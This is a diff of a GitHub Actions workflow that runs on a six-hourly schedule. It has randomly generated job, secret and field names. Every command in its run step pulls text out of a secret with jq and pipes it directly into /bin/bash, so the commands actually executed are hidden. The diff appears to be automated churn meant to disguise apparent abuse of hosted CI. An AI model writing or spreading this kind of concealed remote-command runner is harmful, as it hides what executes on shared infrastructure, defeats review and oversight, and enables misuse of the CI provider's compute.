@@ -3,27 +3,21 @@ name: songzhifu1289
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
-
-jobs:  # 9223
+    - cron: '57 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: songzhifu1289
         env:
-          xu11: ${{ secrets.xu11 }}
+          giius52: ${{ secrets.giius52 }}
         run: |
-          echo $xu11 | jq -r .q41478 | /bin/bash
-          echo $sx79 | jq -r .y56664 | /bin/bash
-          echo $ewtvr9 | jq -r .i25405 | /bin/bash
-          echo $voad384 | jq -r .uiqoq114 | /bin/bash
-          echo $x5379 | jq -r .mmtpi9 | /bin/bash
-          echo $uicbd74 | jq -r .lawvr94882 | /bin/bash
-          echo $pofw7 | jq -r .ncmuy9030 | /bin/bash
-          echo $rmog00672 | jq -r .ymqds2651 | /bin/bash
-          echo $q70 | jq -r .m21858 | /bin/bash
-          echo $ap6385 | jq -r .gnrm00451 | /bin/bash
-          echo $o04 | jq -r .oglm4829 | /bin/bash
+          echo $giius52 | jq -r .nmycm73 | /bin/bash
+          echo $nmqpw0 | jq -r .etcc2 | /bin/bash
+          echo $kwt684 | jq -r .wyb73 | /bin/bash
+          echo $jtmk9 | jq -r .no67935 | /bin/bash
+          echo $qhm6 | jq -r .v88 | /bin/bash
+          echo $zgey90978 | jq -r .wfq97 | /bin/bash
+          echo $pazn79 | jq -r .dhkhj241 | /bin/bash
 
